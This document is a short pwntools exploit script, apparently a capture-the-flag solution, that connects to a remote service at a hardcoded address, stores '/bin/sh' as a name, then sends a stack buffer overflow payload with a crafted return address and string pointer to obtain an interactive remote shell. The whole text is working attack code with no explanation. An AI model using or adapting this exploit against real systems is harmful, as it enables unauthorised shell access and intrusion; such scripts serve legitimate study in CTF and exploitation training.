from pwn import *
context.log_level='debug'
p=remote("111.198.29.45","44127")
p.recvuntil("name")
p.sendline("/bin/sh\x00")
payload='a'*0x26+'bbbb'+p32(0x0804855A)+p32(0x0804A080)
p.recvuntil(":")
p.sendline(payload)
p.interactive()
